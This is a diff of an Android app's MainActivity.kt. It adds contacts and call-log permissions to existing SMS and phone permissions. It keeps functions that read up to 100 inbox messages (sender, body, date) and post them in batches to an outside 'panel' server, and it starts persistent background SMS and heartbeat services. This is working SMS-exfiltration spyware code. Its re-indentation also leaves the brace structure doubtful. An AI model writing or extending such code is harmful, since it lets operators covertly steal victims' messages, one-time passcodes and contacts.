@@ -125,7 +125,9 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.CALL_PHONE
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_CALL_LOG
         )
 
         val allGranted = permissions.all {
@@ -410,181 +412,185 @@ class MainActivity : ComponentActivity() {
                 Log.d(TAG, "✅ Registration successful!")
                 Log.d(TAG, "📥 Response: $response")
             } else {
-                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                val errorBody = try {
+                    conn.errorStream?.bufferedReader()?.use { it.readText() }
+                } catch (e: Exception) {
+                    "Unable to read error: ${e.message}"
+                }
                 Log.e(TAG, "❌ Registration failed!")
-                Log.e(TAG, "📥 Error response ($responseCode): $error")
+                Log.e(TAG, "📥 Error response ($responseCode): $errorBody")
+
+
+            } catch (e: java.net.UnknownHostException) {
+                Log.e(TAG, "❌ Network error: Cannot resolve host - Check internet connection!", e)
+            } catch (e: java.net.SocketTimeoutException) {
+                Log.e(TAG, "❌ Network error: Connection timeout - Server might be down!", e)
+            } catch (e: java.net.ConnectException) {
+                Log.e(TAG, "❌ Network error: Cannot connect - Check if server is running!", e)
+            } catch (e: java.io.IOException) {
+                Log.e(TAG, "❌ Network error: IO Exception - ${e.message}", e)
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Registration error: ${e.message}", e)
+                e.printStackTrace()
+            } finally {
+                conn?.disconnect()
+                Log.d(TAG, "🔌 Connection closed")
+            }
+        }
+
+        private fun uploadAllSmsOnce() {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+                Log.w(TAG, "⚠️ No READ_SMS permission")
+                return
             }
 
-        } catch (e: java.net.UnknownHostException) {
-            Log.e(TAG, "❌ Network error: Cannot resolve host - Check internet connection!", e)
-        } catch (e: java.net.SocketTimeoutException) {
-            Log.e(TAG, "❌ Network error: Connection timeout - Server might be down!", e)
-        } catch (e: java.net.ConnectException) {
-            Log.e(TAG, "❌ Network error: Cannot connect - Check if server is running!", e)
-        } catch (e: java.io.IOException) {
-            Log.e(TAG, "❌ Network error: IO Exception - ${e.message}", e)
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Registration error: ${e.message}", e)
-            e.printStackTrace()
-        } finally {
-            conn?.disconnect()
-            Log.d(TAG, "🔌 Connection closed")
-        }
-    }
+            try {
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "📨 UPLOADING SMS")
+                Log.d(TAG, "════════════════════════════════════════")
 
-    private fun uploadAllSmsOnce() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-            != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "⚠️ No READ_SMS permission")
-            return
-        }
+                val smsUri = Uri.parse("content://sms/inbox")
+                val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")
 
-        try {
-            Log.d(TAG, "════════════════════════════════════════")
-            Log.d(TAG, "📨 UPLOADING SMS")
-            Log.d(TAG, "════════════════════════════════════════")
+                cursor?.use {
+                    val count = it.count
+                    Log.d(TAG, "📨 Found $count SMS messages")
 
-            val smsUri = Uri.parse("content://sms/inbox")
-            val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")
-
-            cursor?.use {
-                val count = it.count
-                Log.d(TAG, "📨 Found $count SMS messages")
-
-                if (count == 0) {
-                    Log.d(TAG, "⚠️ No SMS messages found (normal for emulator)")
-                    return
-                }
-
-                if (it.moveToFirst()) {
-                    val smsBatch = JSONArray()
-                    var totalSent = 0
-
-                    do {
-                        try {
-                            val sms = JSONObject().apply {
-                                put("id", it.getString(it.getColumnIndexOrThrow("_id")))
-                                put("address", it.getString(it.getColumnIndexOrThrow("address")))
-                                put("body", it.getString(it.getColumnIndexOrThrow("body")))
-                                put("date", it.getLong(it.getColumnIndexOrThrow("date")))
-                                put("type", "incoming")
-                                put("deviceId", deviceId)
-                            }
-                            smsBatch.put(sms)
-
-                            if (smsBatch.length() >= 50) {
-                                Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
-                                if (uploadSmsBatch(smsBatch)) {
-                                    totalSent += smsBatch.length()
-                                    // Clear the array for next batch
-                                    while (smsBatch.length() > 0) {
-                                        smsBatch.remove(0)
-                                    }
-                                } else {
-                                    Log.e(TAG, "❌ Batch upload failed, stopping")
-                                    break
-                                }
-                            }
-                        } catch (e: Exception) {
-                            Log.e(TAG, "❌ Error reading SMS: ${e.message}")
-                        }
-                    } while (it.moveToNext())
-
-                    // Send remaining messages
-                    if (smsBatch.length() > 0) {
-                        Log.d(TAG, "📤 Sending final batch of ${smsBatch.length()} messages")
-                        if (uploadSmsBatch(smsBatch)) {
-                            totalSent += smsBatch.length()
-                        }
+                    if (count == 0) {
+                        Log.d(TAG, "⚠️ No SMS messages found (normal for emulator)")
+                        return
                     }
 
-                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
+                    if (it.moveToFirst()) {
+                        val smsBatch = JSONArray()
+                        var totalSent = 0
+
+                        do {
+                            try {
+                                val sms = JSONObject().apply {
+                                    put("id", it.getString(it.getColumnIndexOrThrow("_id")))
+                                    put("address", it.getString(it.getColumnIndexOrThrow("address")))
+                                    put("body", it.getString(it.getColumnIndexOrThrow("body")))
+                                    put("date", it.getLong(it.getColumnIndexOrThrow("date")))
+                                    put("type", "incoming")
+                                    put("deviceId", deviceId)
+                                }
+                                smsBatch.put(sms)
+
+                                if (smsBatch.length() >= 50) {
+                                    Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
+                                    if (uploadSmsBatch(smsBatch)) {
+                                        totalSent += smsBatch.length()
+                                        // Clear the array for next batch
+                                        while (smsBatch.length() > 0) {
+                                            smsBatch.remove(0)
+                                        }
+                                    } else {
+                                        Log.e(TAG, "❌ Batch upload failed, stopping")
+                                        break
+                                    }
+                                }
+                            } catch (e: Exception) {
+                                Log.e(TAG, "❌ Error reading SMS: ${e.message}")
+                            }
+                        } while (it.moveToNext())
+
+                        // Send remaining messages
+                        if (smsBatch.length() > 0) {
+                            Log.d(TAG, "📤 Sending final batch of ${smsBatch.length()} messages")
+                            if (uploadSmsBatch(smsBatch)) {
+                                totalSent += smsBatch.length()
+                            }
+                        }
+
+                        Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
+                    }
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
+                e.printStackTrace()
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
-            e.printStackTrace()
         }
-    }
 
-    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
-        var conn: HttpURLConnection? = null
-        return try {
-            val body = JSONObject().apply {
-                put("messages", smsArray)
-            }
+        private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
+            var conn: HttpURLConnection? = null
+            return try {
+                val body = JSONObject().apply {
+                    put("messages", smsArray)
+                }
 
-            Log.d(TAG, "📤 Uploading ${smsArray.length()} messages...")
+                Log.d(TAG, "📤 Uploading ${smsArray.length()} messages...")
 
-            val url = URL("https://panel.panelguy.xyz/sms/bulk")
-            conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Content-Type", "application/json")
-            conn.connectTimeout = 15000
-            conn.readTimeout = 15000
-            conn.doOutput = true
+                val url = URL("https://panel.panelguy.xyz/sms/bulk")
+                conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+                conn.doOutput = true
 
-            conn.outputStream.use { os ->
-                val bytes = body.toString().toByteArray(Charsets.UTF_8)
-                os.write(bytes)
-                os.flush()
-                Log.d(TAG, "✅ SMS data sent (${bytes.size} bytes)")
-            }
+                conn.outputStream.use { os ->
+                    val bytes = body.toString().toByteArray(Charsets.UTF_8)
+                    os.write(bytes)
+                    os.flush()
+                    Log.d(TAG, "✅ SMS data sent (${bytes.size} bytes)")
+                }
 
-            val responseCode = conn.responseCode
-            Log.d(TAG, "📥 SMS upload response: $responseCode")
+                val responseCode = conn.responseCode
+                Log.d(TAG, "📥 SMS upload response: $responseCode")
 
-            if (responseCode in 200..299) {
-                val response = conn.inputStream.bufferedReader().use { it.readText() }
-                Log.d(TAG, "✅ SMS upload successful: $response")
-                true
-            } else {
-                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
-                Log.e(TAG, "❌ SMS upload failed: $error")
+                if (responseCode in 200..299) {
+                    val response = conn.inputStream.bufferedReader().use { it.readText() }
+                    Log.d(TAG, "✅ SMS upload successful: $response")
+                    true
+                } else {
+                    val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                    Log.e(TAG, "❌ SMS upload failed: $error")
+                    false
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ SMS batch error: ${e.message}", e)
+                e.printStackTrace()
                 false
+            } finally {
+                conn?.disconnect()
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ SMS batch error: ${e.message}", e)
-            e.printStackTrace()
-            false
-        } finally {
-            conn?.disconnect()
+        }
+
+        private fun startBackgroundService() {
+            try {
+                Log.d(TAG, "🚀 Starting SmsService...")
+                val intent = Intent(this, SmsService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(intent)
+                } else {
+                    startService(intent)
+                }
+                Log.d(TAG, "✅ SmsService started")
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to start SmsService: ${e.message}", e)
+            }
+        }
+
+        private fun startHeartbeatService() {
+            try {
+                Log.d(TAG, "🚀 Starting HeartbeatService...")
+                val intent = Intent(this, HeartbeatService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(intent)
+                } else {
+                    startService(intent)
+                }
+                Log.d(TAG, "✅ HeartbeatService started")
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
+            }
+        }
+
+        override fun onDestroy() {
+            super.onDestroy()
+            handler.removeCallbacks(batteryUpdater)
+            Log.d(TAG, "👋 MainActivity destroyed")
         }
     }
-
-    private fun startBackgroundService() {
-        try {
-            Log.d(TAG, "🚀 Starting SmsService...")
-            val intent = Intent(this, SmsService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d(TAG, "✅ SmsService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}", e)
-        }
-    }
-
-    private fun startHeartbeatService() {
-        try {
-            Log.d(TAG, "🚀 Starting HeartbeatService...")
-            val intent = Intent(this, HeartbeatService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d(TAG, "✅ HeartbeatService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
-        }
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        handler.removeCallbacks(batteryUpdater)
-        Log.d(TAG, "👋 MainActivity destroyed")
-    }
-}
